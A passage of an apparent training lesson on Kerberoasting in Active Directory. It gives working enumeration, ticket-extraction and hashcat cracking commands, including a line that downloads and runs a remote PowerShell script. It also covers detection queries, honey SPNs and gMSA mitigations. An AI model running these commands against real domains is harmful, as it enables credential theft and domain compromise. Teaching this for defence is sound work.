{
  "lesson_id": "ad-kerb-001",
  "title": "Kerberoasting Attack",
  "domain": "active_directory",
  "difficulty": 3,
  "estimated_time": 75,
  "prerequisites": ["ad-enum-001", "ad-auth-001"],
  "concepts": [
    "Service Principal Names (SPNs)",
    "Kerberos TGS tickets",
    "Offline password cracking",
    "RC4 vs AES encryption",
    "Service account security",
    "Managed Service Accounts (MSAs)",
    "Event ID 4769 detection",
    "Kerberoasting mitigation"
  ],
  "learning_objectives": [
    "Understand how Kerberoasting exploits the Kerberos authentication protocol",
    "Enumerate Service Principal Names (SPNs) in Active Directory environments",
    "Extract and crack TGS tickets offline to recover service account passwords",
    "Detect Kerberoasting attacks through Windows event logs and EDR",
    "Implement defensive measures including strong passwords and encryption upgrades"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "title": "The Patient Hunter Mindset",
      "content": "Kerberoasting is the art of patience and preparation. Unlike loud exploitation techniques, Kerberoasting is quiet, passive, and devastatingly effective. You're not breaking down doors—you're requesting legitimate tickets and cracking them offline where no one can see you.\n\n**Jim Kwik Learning Principle: Focus**\n\nThis lesson requires deep focus on understanding Kerberos internals. You'll learn why a legitimate authentication protocol becomes a security vulnerability when service accounts have weak passwords. **The key is understanding the 'why' behind each step**, not just memorizing commands.\n\n**Your Mindset Transformation:**\n- **From**: \"I'll run tools and see what happens\"\n- **To**: \"I understand Kerberos ticket structures and can explain why this attack works\"\n\nKerberoasting is consistently ranked as one of the top 5 Active Directory attack techniques. Master this, and you'll understand how attackers gain domain admin access in 60% of AD compromises.\n\n**Remember**: The best defenders think like attackers. By learning Kerberoasting, you're learning to protect your organization's most critical assets."
    },
    {
      "type": "explanation",
      "title": "What is Kerberoasting?",
      "content": "**Kerberoasting** is an attack technique that exploits the Kerberos authentication protocol to extract password hashes for service accounts in Active Directory, enabling offline password cracking.\n\n## The Attack in Plain English\n\nImagine you walk into a government building and request a visitor badge (TGS ticket) for a specific office. The guard gives you the badge, which is encrypted with that office's password. Now you take that encrypted badge home and try millions of password guesses until you decrypt it. Once you crack it, you know the office's password.\n\nThat's Kerberoasting.\n\n## Why Does This Work?\n\n**The Kerberos Design Flaw:**\n\n1. **Any authenticated user** can request a TGS (Ticket Granting Service) ticket for any service\n2. The TGS ticket is **encrypted with the service account's password hash**\n3. You receive the encrypted ticket **even if you never use the service**\n4. You can crack the ticket **completely offline** with no detection\n\n**The Critical Vulnerability**: Service accounts often have:\n- **Weak passwords** (set once, never rotated)\n- **Never-expiring passwords**\n- **High privileges** (often Domain Admin or equivalent)\n- **RC4 encryption** (weaker than AES, faster to crack)\n\n## MITRE ATT&CK Context\n\n**Technique**: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting\n**Tactics**: Credential Access\n**Platforms**: Windows, Active Directory\n**Permissions Required**: User (any domain user account)\n\n**Real-World Usage:**\n- **APT29 (Cozy Bear)**: Used Kerberoasting in government network compromises\n- **FIN7**: Employed Kerberoasting to escalate privileges in financial institutions\n- **Ransomware groups**: Use Kerberoasting as standard AD attack path\n\n## Attack Prerequisites\n\n**Minimal Requirements:**\n✅ **Domain user account** (even low-privilege)\n✅ **Network access** to a Domain Controller\n✅ **Basic tools** (PowerShell, Rubeus, Impacket)\n\nThat's it. You don't need admin rights. You don't need to exploit any vulnerabilities. You just need to be an authenticated domain user.\n\n## Attack Flow Overview\n\n```\n┌─────────────────────────────────────────────────┐\n│         KERBEROASTING ATTACK FLOW               │\n└─────────────────────────────────────────────────┘\n\nStep 1: ENUMERATE SPNs\n   ↓\n   Domain User → LDAP Query → Domain Controller\n   \"Give me all accounts with servicePrincipalName\"\n   ← Returns: 15 service accounts\n\nStep 2: REQUEST TGS TICKETS\n   ↓\n   Attacker → \"I need a ticket for MSSQLSvc/sql01\"\n   Domain Controller → Generates TGS encrypted with\n                       service account password\n   ← Returns: Encrypted TGS ticket\n\nStep 3: EXTRACT TICKET\n   ↓\n   Memory/Cache → Extract Kerberos ticket\n   Convert to hashcat/john format\n   Save to file: kerberoast_hashes.txt\n\nStep 4: OFFLINE CRACKING\n   ↓\n   hashcat -m 13100 kerberoast_hashes.txt rockyou.txt\n   Try millions of passwords per second\n   ← Password found: \"Summer2019!\"\n\nStep 5: PRIVILEGE ESCALATION\n   ↓\n   Service account = Domain Admin?\n   → Full domain compromise\n```\n\n## Why This Is Devastating\n\n**Stealth**: \n- Requests look like normal Kerberos traffic\n- No failed login attempts (cracking is offline)\n- No alerts unless you monitor TGS requests\n\n**Effectiveness**:\n- Works in **90%+ of Active Directory environments**\n- Success rate of **30-40%** when using common password lists\n- **One cracked service account** often = domain admin\n\n**Accessibility**:\n- Requires only **basic domain user access**\n- No exploitation needed\n- Works from Windows or Linux\n\nIn the next sections, you'll learn the exact techniques, tools, and commands to perform this attack—and more importantly, how to defend against it."
    },
    {
      "type": "explanation",
      "title": "Understanding Service Principal Names (SPNs)",
      "content": "Before you can Kerberoast, you must understand **Service Principal Names (SPNs)**—the foundation of this attack.\n\n## What Are SPNs?\n\n**Service Principal Name (SPN)** is a unique identifier for a service instance in Active Directory. Think of it as the service's \"phone number\" in the directory.\n\n**Format**: `ServiceClass/Host:Port/ServiceName`\n\n**Examples:**\n```\nMSSQLSvc/sql01.corp.local:1433\nHTTP/sharepoint.corp.local\nCIFS/fileserver.corp.local\nHTTP/webserver:8080\n```\n\n## Why SPNs Matter for Kerberoasting\n\n**Critical Fact**: Only accounts with registered SPNs can be Kerberoasted.\n\n**Why?** Because Kerberos only issues TGS tickets for services that have SPNs. No SPN = no TGS ticket = no Kerberoasting.\n\n## SPN Components Breakdown\n\n**1. ServiceClass** (required)\n- Identifies the type of service\n- Common classes:\n  - `MSSQLSvc` - Microsoft SQL Server\n  - `HTTP` - Web services (IIS, SharePoint)\n  - `CIFS` - File shares\n  - `LDAP` - Directory services\n  - `HOST` - Generic host services\n  - `RestrictedKrbHost` - Kerberos authentication\n  - `TERMSRV` - Terminal Services (RDP)\n\n**2. Host** (required)\n- FQDN or NetBIOS name of the server\n- Examples: `sql01.corp.local` or `sql01`\n\n**3. Port** (optional)\n- Port number if non-standard\n- Example: `:8080` for non-standard HTTP\n\n**4. ServiceName** (optional)\n- Named instance identifier\n- Example: `MSSQLSvc/sql01.corp.local:1433/INSTANCENAME`\n\n## Types of Accounts with SPNs\n\n### 1. Computer Accounts\n- Every domain-joined computer has SPNs\n- Passwords are **120+ random characters**\n- Changed **automatically every 30 days**\n- **Not crackable** with current technology\n- **Skip these** during Kerberoasting\n\n**Example SPNs on computer accounts:**\n```\nHOST/DC01.corp.local\nRestrictedKrbHost/DC01.corp.local\nLDAP/DC01.corp.local\n```\n\n### 2. User Service Accounts (TARGET!)\n- Human-created accounts for services\n- Often have **weak, static passwords** (\"Summer2019!\")\n- **Never rotate** passwords\n- Frequently have **high privileges**\n- **PRIMARY TARGET** for Kerberoasting\n\n**Example:**\n```\nAccount: svc_mssql\nSPN: MSSQLSvc/sql01.corp.local:1433\nPassword: SQLService123!\nGroup Membership: Domain Admins (💀)\n```\n\n### 3. Group Managed Service Accounts (gMSA)\n- Passwords are **127 random characters**\n- Changed **automatically every 30 days**\n- **Not crackable**\n- Microsoft's solution to Kerberoasting\n\n## Common Vulnerable SPNs\n\n**High-Value Targets:**\n\n```\n┌──────────────┬────────────────────────────┬─────────────────────┐\n│ Service Type │ Common SPN Format          │ Why Valuable        │\n├──────────────┼────────────────────────────┼─────────────────────┤\n│ SQL Server   │ MSSQLSvc/host:1433         │ Often Domain Admin  │\n│ IIS/Web      │ HTTP/webserver             │ App pool accounts   │\n│ SharePoint   │ HTTP/sharepoint            │ High privileges     │\n│ Exchange     │ HTTP/mail.corp.local       │ Mailbox access      │\n│ ADFS         │ HTTP/adfs.corp.local       │ Federation access   │\n│ Custom Apps  │ HTTP/customapp             │ Legacy apps         │\n└──────────────┴────────────────────────────┴─────────────────────┘\n```\n\n## SPN Enumeration - The First Step\n\n**LDAP Query for SPNs:**\n```ldap\n(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))\n```\n\n**Translation**: \"Find all user accounts (not computers) with at least one SPN\"\n\n**PowerShell Enumeration:**\n```powershell\n# Simple SPN enumeration\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n\n# With details\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName,MemberOf | \n  Select-Object Name,ServicePrincipalName,@{Name=\"Groups\";Expression={$_.MemberOf}}\n\n# Count SPNs per account\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | \n  Select-Object Name,@{Name=\"SPNCount\";Expression={$_.ServicePrincipalName.Count}}\n```\n\n## SPN Red Flags\n\n**Indicators of high-value targets:**\n\n✅ **User account** (not computer account)\n✅ **PasswordLastSet** > 1 year ago\n✅ **MemberOf** includes Domain Admins or high-privilege groups\n✅ **ServicePrincipalName** includes SQL, HTTP, or custom services\n✅ **AdminCount** = 1 (protected admin account)\n\n**Example of a golden target:**\n```\nName: svc_sharepoint\nSPN: HTTP/sharepoint.corp.local\nPasswordLastSet: 08/15/2018\nMemberOf: Domain Admins, Enterprise Admins\nAdminCount: 1\n\n💀 This is a jackpot account!\n```\n\n## Memory Aid: SPN Targeting\n\n**SPUD Framework** (which SPNs to target):\n- **S**ervice account (user, not computer)\n- **P**assword old (1+ years)\n- **U**nprivileged cracking (RC4 encryption)\n- **D\"omain admin member (high-value)\n\nIn the next section, you'll learn how to enumerate these SPNs and request the TGS tickets for offline cracking."
    },
    {
      "type": "explanation",
      "title": "Kerberoasting: Step-by-Step Attack",
      "content": "Now you'll learn the complete Kerberoasting attack chain, from enumeration to exploitation.\n\n## Attack Environment\n\n**Scenario**: You've compromised a low-privilege domain user account:\n- Username: `bob@corp.local`\n- Password: `Password123!`\n- Groups: Domain Users (basic access)\n- Goal: Escalate to Domain Admin\n\n## Step 1: Enumerate Service Principal Names\n\n### Method 1: PowerShell (Windows)\n\n```powershell\n# Basic enumeration\nsetspn -T corp.local -Q */*\n\n# Using Active Directory module\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName |\n  Select-Object Name,ServicePrincipalName\n\n# Filter out computer accounts (not crackable)\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\" -and ObjectClass -eq \"user\"} -Properties ServicePrincipalName,PasswordLastSet,MemberOf |\n  Select-Object Name,ServicePrincipalName,PasswordLastSet,@{Name=\"Groups\";Expression={$_.MemberOf -join \"; \"}}\n```\n\n**Output:**\n```\nName             ServicePrincipalName                     PasswordLastSet      Groups\n----             --------------------                     ---------------      ------\nsvc_mssql        MSSQLSvc/sql01.corp.local:1433          8/15/2018 2:30 PM    CN=Domain Admins...\nsvc_sharepoint   HTTP/sharepoint.corp.local              1/10/2019 9:15 AM    CN=Domain Admins...\nsvc_iis          HTTP/webapp.corp.local                  6/22/2020 4:45 PM    CN=IIS_IUSRS...\n```\n\n### Method 2: Impacket (Linux)\n\n```bash\n# GetUserSPNs.py - enumerate and request tickets\nGetUserSPNs.py corp.local/bob:'Password123!' -dc-ip 10.10.10.10 -request\n\n# With outputfile\nGetUserSPNs.py corp.local/bob:'Password123!' -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt\n\n# Enumerate only (no ticket requests)\nGetUserSPNs.py corp.local/bob:'Password123!' -dc-ip 10.10.10.10\n```\n\n**Output:**\n```\nServicePrincipalName              Name          MemberOf\n--------------------------------  ------------  -----------------------------------------------\nMSSQLSvc/sql01.corp.local:1433    svc_mssql     CN=Domain Admins,CN=Users,DC=corp,DC=local\nHTTP/sharepoint.corp.local        svc_sharepoint CN=Domain Admins,CN=Users,DC=corp,DC=local\nHTTP/webapp.corp.local            svc_iis       CN=IIS_IUSRS,CN=Builtin,DC=corp,DC=local\n\n$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3...[hash]\n$krb5tgs$23$*svc_sharepoint$CORP.LOCAL$HTTP/sharepoint.corp.local*$d4e5f6...[hash]\n```\n\n### Method 3: Rubeus (Windows, post-exploitation)\n\n```powershell\n# Rubeus kerberoast - enumerate and extract\nRubeus.exe kerberoast /outfile:kerberoast_hashes.txt\n\n# Target specific user\nRubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql_hash.txt\n\n# Request with specific encryption (prefer RC4 for faster cracking)\nRubeus.exe kerberoast /tgtdeleg /rc4opsec\n\n# Kerberoast and show statistics\nRubeus.exe kerberoast /stats\n```\n\n**Rubeus Output:**\n```\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : svc_mssql\n[*] Target Domain          : corp.local\n[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 3\n\n[*] SamAccountName         : svc_mssql\n[*] DistinguishedName      : CN=svc_mssql,CN=Users,DC=corp,DC=local\n[*] ServicePrincipalName   : MSSQLSvc/sql01.corp.local:1433\n[*] PwdLastSet             : 8/15/2018 2:30:47 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*svc_mssql$CORP.LOCAL$...\n```\n\n## Step 2: Request TGS Tickets\n\n**PowerShell method (manual):**\n```powershell\n# Request ticket using Add-Type\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/sql01.corp.local:1433\"\n\n# Verify ticket in cache\nklist\n```\n\n**What happens behind the scenes:**\n```\n1. Your machine sends TGS-REQ to Domain Controller:\n   \"I need a service ticket for MSSQLSvc/sql01.corp.local:1433\"\n\n2. Domain Controller looks up the SPN:\n   - Finds account: svc_mssql\n   - Gets account's password hash\n   - Encrypts TGS ticket with that hash\n\n3. Domain Controller sends TGS-REP back:\n   - Contains encrypted TGS ticket\n   - You can't read it (encrypted with service account password)\n   - But you can extract it and crack offline!\n```\n\n## Step 3: Extract Kerberos Tickets from Memory\n\n### Using Rubeus (preferred):\n```powershell\n# Rubeus does extraction automatically\nRubeus.exe kerberoast /outfile:hashes.txt\n```\n\n### Using Invoke-Kerberoast (PowerShell):\n```powershell\n# Import PowerView or Invoke-Kerberoast\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')\n\n# Kerberoast all accounts\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt\n\n# Target specific account\nInvoke-Kerberoast -Identity svc_mssql -OutputFormat Hashcat\n```\n\n### Using Mimikatz:\n```powershell\n# Export all Kerberos tickets\nmimikatz # kerberos::list /export\n\n# Convert .kirbi to hashcat format using kirbi2john.py\npython kirbi2john.py ticket.kirbi > hash.txt\n```\n\n**Extracted hash format (Hashcat mode 13100 for TGS-REP RC4):**\n```\n$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a1b2c3d4e5f6...\n```\n\n## Step 4: Offline Password Cracking\n\nThis is where the magic happens. You're now **completely offline**. No network traffic. No failed login attempts. Just you and your GPU trying millions of passwords per second.\n\n### Using Hashcat (GPU cracking - fastest):\n\n```bash\n# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4)\n# Mode 19600 = Kerberos 5 TGS-REP etype 17 (AES128)\n# Mode 19700 = Kerberos 5 TGS-REP etype 18 (AES256)\n\n# Dictionary attack with rockyou.txt\nhashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force\n\n# With rules (more effective)\nhashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n# Combination attack (combine wordlists)\nhashcat -m 13100 kerberoast_hashes.txt -a 1 wordlist1.txt wordlist2.txt\n\n# Mask attack (password patterns)\n# Pattern: Capital + 6 lowercase + 4 digits + special\nhashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d?d?d?\n\n# Show cracked passwords\nhashcat -m 13100 kerberoast_hashes.txt --show\n```\n\n**Cracking speeds (NVIDIA RTX 3090):**\n- RC4 encryption: **15-20 billion passwords/second**\n- AES256 encryption: **500-800 million passwords/second**\n\n### Using John the Ripper (CPU cracking):\n\n```bash\n# Basic cracking with wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt\n\n# With mangling rules\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules kerberoast_hashes.txt\n\n# Show cracked passwords\njohn --show kerberoast_hashes.txt\n```\n\n**Example output:**\n```\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nSummer2019!      (?) \nSharePoint123!   (?)\nSQLService123    (?)\n3g 0:00:02:45 DONE (2024-01-15 14:32) 0.01815g/s 1456Kp/s 1456Kc/s 4368KC/s\n```\n\n## Step 5: Validate and Exploit\n\n**Test the cracked credentials:**\n```powershell\n# Using PowerShell\n$password = ConvertTo-SecureString 'Summer2019!' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('CORP\\svc_mssql', $password)\n\n# Test with remote command\nInvoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {whoami}\n\n# Check group membership\nnet user svc_mssql /domain\n```\n\n**If svc_mssql is Domain Admin:**\n```bash\n# Linux: Use psexec to get SYSTEM shell on Domain Controller\npsexec.py corp.local/svc_mssql:'Summer2019!'@10.10.10.10\n\n# Windows: Create golden ticket, dump NTDS.dit, etc.\n```\n\n## Attack Timeline\n\n```\n[00:00] - Enumerate SPNs (30 seconds)\n[00:01] - Request TGS tickets (10 seconds)\n[00:01] - Extract tickets to hashcat format (5 seconds)\n[00:01] - Start hashcat with rockyou.txt\n[00:15] - First password cracked: \"Summer2019!\" (14 minutes)\n[00:20] - Second password cracked: \"SQLService123\" (5 more minutes)\n[00:21] - Validate credentials (30 seconds)\n[00:22] - svc_mssql confirmed as Domain Admin\n[00:22] - 🎯 Domain Compromised\n```\n\n**Total time from low-privilege user to Domain Admin: 22 minutes.**\n\nIn the next section, you'll learn how defenders can detect and prevent this attack."
    },
    {
      "type": "explanation",
      "title": "Detection and Defense",
      "content": "Now that you understand how devastating Kerberoasting can be, let's learn how to detect and prevent it.\n\n## Detection Strategy\n\nKerberoasting is **difficult to detect** because it uses legitimate Kerberos functionality. However, there are telltale signs.\n\n### Windows Event Log Detection\n\n**Event ID 4769: Kerberos Service Ticket (TGS) Request**\n\nThis event is logged on Domain Controllers every time someone requests a service ticket.\n\n**Key Detection Fields:**\n```xml\nEvent ID: 4769\nTask Category: Kerberos Service Ticket Operations\n\nKey Fields:\n- Account Name: Who requested the ticket\n- Service Name: Which SPN was requested\n- Ticket Encryption Type: 0x17 (RC4) vs 0x12 (AES256)\n- Client Address: Source IP\n- Failure Code: 0x0 (success)\n```\n\n**Red Flags for Kerberoasting:**\n\n✅ **RC4 Encryption (0x17)**: Most suspicious\n- Modern Windows uses AES by default\n- Attackers downgrade to RC4 (faster to crack)\n- **Detection**: TGS requests with encryption type 0x17\n\n✅ **Multiple TGS Requests in Short Time**:\n- Normal users request 1-5 tickets per hour\n- Kerberoasting = 10-50+ requests in minutes\n- **Detection**: Same account requesting 10+ unique SPNs within 5 minutes\n\n✅ **Unusual Service Names**:\n- Users typically access 3-5 regular services\n- Kerberoasting = requests for services they never use\n- **Detection**: TGS requests for SPNs the user has never accessed before\n\n✅ **Requests from Non-Windows Systems**:\n- Linux tools (Impacket) create different ticket request patterns\n- **Detection**: TGS requests from unusual client addresses\n\n### Detection Query Examples\n\n**Splunk SPL:**\n```spl\n# Detect multiple TGS requests with RC4 encryption\nindex=windows EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!=\"krbtgt\" Service_Name!=\"*$\"\n| bucket _time span=5m\n| stats dc(Service_Name) as unique_services values(Service_Name) as services by _time, Account_Name, Client_Address\n| where unique_services > 10\n| sort - unique_services\n```\n\n**Microsoft Sentinel KQL:**\n```kusto\nSecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == \"0x17\"  // RC4\n| where ServiceName !endswith \"$\"       // Exclude computer accounts\n| where ServiceName != \"krbtgt\"\n| summarize ServiceCount = dcount(ServiceName), Services = make_set(ServiceName) by bin(TimeGenerated, 5m), AccountName, IpAddress\n| where ServiceCount > 10\n| project TimeGenerated, AccountName, IpAddress, ServiceCount, Services\n| order by ServiceCount desc\n```\n\n**Sigma Rule (Generic SIEM):**\n```yaml\ntitle: Potential Kerberoasting Attack\nstatus: stable\ndescription: Detects possible Kerberoasting attack with multiple TGS requests\nreferences:\n    - https://attack.mitre.org/techniques/T1558/003/\nauthor: Security Team\ndate: 2024/01/15\ntags:\n    - attack.credential_access\n    - attack.t1558.003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769\n        TicketEncryptionType: '0x17'\n    filter:\n        ServiceName|endswith: '$'\n    timeframe: 5m\n    condition: selection and not filter | count(ServiceName) by AccountName > 10\nfalsepositives:\n    - Automated service account scanning\n    - Monitoring tools\nlevel: high\n```\n\n### Advanced Detection: Honey SPNs\n\n**Concept**: Create fake service accounts with SPNs that no legitimate user should ever access. Any TGS request for these SPNs = confirmed attack.\n\n**Implementation:**\n```powershell\n# Create honey service account\nNew-ADUser -Name \"svc_honeypot_db\" -AccountPassword (ConvertTo-SecureString \"ComplexPassword123!@#\" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true\n\n# Set SPN (make it look attractive)\nSet-ADUser -Identity \"svc_honeypot_db\" -ServicePrincipalNames @{Add=\"MSSQLSvc/sql-prod-sensitive.corp.local:1433\"}\n\n# Add to high-privilege group (more attractive to attackers)\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"svc_honeypot_db\"\n\n# Set up alerting on Event 4769 for this specific SPN\n```\n\n**Alert Logic:**\n```spl\nindex=windows EventCode=4769 Service_Name=\"MSSQLSvc/sql-prod-sensitive.corp.local:1433\"\n| eval severity=\"CRITICAL\"\n| eval message=\"KERBEROASTING ATTACK DETECTED - Honey SPN accessed by \" + Account_Name\n| sendalert security_team\n```\n\n**Why This Works:**\n- **100% accuracy**: No false positives (no legitimate access)\n- **Early detection**: Catches attackers during reconnaissance\n- **Attribution**: Identifies the compromised account\n\n### EDR/AV Detection\n\n**Behavioral Indicators:**\n\n1. **Rubeus.exe execution**\n   - Command line: `rubeus.exe kerberoast`\n   - Process creates file with TGS hashes\n\n2. **PowerShell suspicious activity**\n   - `Add-Type -AssemblyName System.IdentityModel`\n   - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken`\n   - Sequential Kerberos ticket requests\n\n3. **Impacket on network**\n   - GetUserSPNs.py traffic patterns\n   - Unusual Kerberos packets from non-Windows IPs\n\n**Detection rules (example for Defender ATP):**\n```kusto\nDeviceProcessEvents\n| where ProcessCommandLine has_any (\"rubeus\", \"kerberoast\", \"GetUserSPNs\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath\n```\n\n## Prevention and Mitigation\n\n### 1. Strong Service Account Passwords (Critical)\n\n**Problem**: Weak passwords (\"Summer2019!\") crack in minutes\n**Solution**: 25+ character random passwords\n\n```powershell\n# Generate cryptographically random password\n$length = 30\n$password = -join ((33..126) | Get-Random -Count $length | ForEach-Object {[char]$_})\nWrite-Output $password\n\n# Example output: \"k9@mZ#xL2$pQw7!vN8&yR4^tG6*hJ3\"\n\n# Set service account password\nSet-ADAccountPassword -Identity svc_mssql -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset\n```\n\n**Cracking time comparison:**\n```\nPassword Length    Complexity          Hashcat Time (RTX 3090)\n---------------    ----------          -----------------------\n8 characters       Summer19            2 seconds\n12 characters      Summer2019!         15 minutes\n16 characters      Summer2019!@#$      3 days\n25 characters      k9@mZ#xL2$pQw...    5,000+ years ✅\n```\n\n### 2. Managed Service Accounts (Best Solution)\n\n**Group Managed Service Accounts (gMSA)** solve Kerberoasting entirely.\n\n**Why gMSAs are immune:**\n- Passwords are **127 random characters**\n- Automatically rotated **every 30 days**\n- Managed by Active Directory (no human knows password)\n- **Computationally impossible to crack**\n\n**Create gMSA:**\n```powershell\n# Enable gMSA (one-time setup)\nAdd-KdsRootKey -EffectiveImmediately\n\n# Create gMSA for SQL Service\nNew-ADServiceAccount -Name \"svc_mssql_gMSA\" -DNSHostName \"sql01.corp.local\" -PrincipalsAllowedToRetrieveManagedPassword \"SQL-Servers\"\n\n# Install on target server\nInstall-ADServiceAccount -Identity \"svc_mssql_gMSA\"\n\n# Configure service to use gMSA\n# Service logon: CORP\\svc_mssql_gMSA$\n# Password: (leave blank - managed automatically)\n```\n\n**Migration checklist:**\n```\n☐ Identify all service accounts with SPNs\n☐ Create gMSAs for each service\n☐ Grant gMSAs necessary permissions\n☐ Update service configurations\n☐ Test services with gMSAs\n☐ Disable/delete old service accounts\n☐ Monitor for issues\n```\n\n### 3. Disable RC4 Encryption (Force AES)\n\nRC4 is **100x faster to crack** than AES256.\n\n**Group Policy: Disable RC4**\n```\nComputer Configuration → \n  Windows Settings → \n    Security Settings → \n      Local Policies → \n        Security Options → \n          \"Network security: Configure encryption types allowed for Kerberos\"\n\nDisable: RC4_HMAC_MD5\nEnable: AES128_HMAC_SHA1, AES256_HMAC_SHA1, Future encryption types\n```\n\n**Verify encryption type:**\n```powershell\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties msDS-SupportedEncryptionTypes |\n  Select-Object Name,@{Name=\"EncryptionTypes\";Expression={$_.'msDS-SupportedEncryptionTypes'}}\n```\n\n**Encryption type values:**\n```\n0x01 = DES_CBC_CRC (ancient, never use)\n0x02 = DES_CBC_MD5 (ancient, never use)\n0x04 = RC4_HMAC_MD5 (weak, disable)\n0x08 = AES128_HMAC_SHA1 (good)\n0x10 = AES256_HMAC_SHA1 (best)\n```\n\n### 4. Least Privilege (Limit Blast Radius)\n\n**Never** make service accounts Domain Admins.\n\n**Principle**: Service accounts should have **only** the permissions needed for their specific service.\n\n**Example - SQL Server Service Account:**\n```\n❌ BAD: Domain Admins\n✅ GOOD:\n  - Local admin on SQL server only\n  - Read/write to database files folder\n  - Permissions to register SPN (if needed)\n  - Nothing else\n```\n\n### 5. Account Expiration and Auditing\n\n```powershell\n# Set password change policy for service accounts\nSet-ADUser -Identity svc_mssql -ChangePasswordAtLogon $false -PasswordNeverExpires $false\nSet-ADAccountPassword -Identity svc_mssql -NewPassword $newPassword\n\n# Enable auditing on sensitive service accounts\n$acl = Get-Acl \"AD:\\CN=svc_mssql,CN=Users,DC=corp,DC=local\"\n$auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule([System.Security.Principal.SecurityIdentifier]\"S-1-1-0\", [System.DirectoryServices.ActiveDirectoryRights]::GenericAll, [System.Security.AccessControl.AuditFlags]::Success)\n$acl.AddAuditRule($auditRule)\nSet-Acl \"AD:\\CN=svc_mssql,CN=Users,DC=corp,DC=local\" $acl\n```\n\n## Defense-in-Depth Summary\n\n**Tier 1: Prevention (Stop the attack)**\n- ✅ Use Group Managed Service Accounts (gMSA)\n- ✅ 25+ character random passwords for non-gMSA accounts\n- ✅ Disable RC4, enforce AES256\n- ✅ Least privilege (no Domain Admin service accounts)\n\n**Tier 2: Detection (Catch attackers)**\n- ✅ Monitor Event ID 4769 for RC4 encryption\n- ✅ Alert on multiple TGS requests from single account\n- ✅ Deploy honey SPNs\n- ✅ EDR rules for Rubeus/Impacket/PowerShell Kerberoasting\n\n**Tier 3: Response (Limit damage)**\n- ✅ Automated account lockout on suspected Kerberoasting\n- ✅ Incident response playbook\n- ✅ Regular password rotation (if not using gMSA)\n- ✅ Network segmentation (limit lateral movement)\n\nImplement **all three tiers** for comprehensive protection."
    },
    {
      "type": "real_world",
      "title": "Case Study: Kerberoasting in a Financial Institution",
      "content": "**Target**: Regional bank with 5,000 employees\n**Attacker**: External penetration testing team\n**Objective**: Achieve Domain Admin through Kerberoasting\n\n## Initial Access\n\n**Day 1: Phishing Campaign**\n- Sent targeted spear-phishing emails to IT help desk\n- Malicious attachment delivered Meterpreter payload\n- Compromised account: `helpdesk-user@bank.local` (standard user, no special privileges)\n\n## Reconnaissance\n\n**Day 1: Network Enumeration**\n```powershell\n# From compromised workstation\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName,PasswordLastSet,MemberOf\n```\n\n**Results**:\n```\n15 service accounts with SPNs:\n- 8 computer accounts (skipped - 120 char passwords)\n- 7 user service accounts (TARGETS)\n\nHigh-value targets identified:\n1. svc_exchange (HTTP/mail.bank.local) - Exchange Admin\n2. svc_sharepoint (HTTP/sharepoint.bank.local) - Domain Admins (!)\n3. svc_sql_reporting (MSSQLSvc/sql-reports.bank.local:1433) - Local admin on 12 servers\n4. svc_backup (HOST/backup.bank.local) - Backup Operators\n```\n\n## Kerberoasting Attack\n\n**Day 1: Ticket Extraction**\n```bash\n# From Kali Linux via SOCKS proxy\nGetUserSPNs.py bank.local/helpdesk-user:'PhishedPassword123' -dc-ip 10.20.30.40 -request -outputfile kerberoast.txt\n```\n\n**Extracted 7 TGS tickets**:\n- 5 with AES256 encryption (slower to crack)\n- 2 with RC4 encryption (svc_sharepoint, 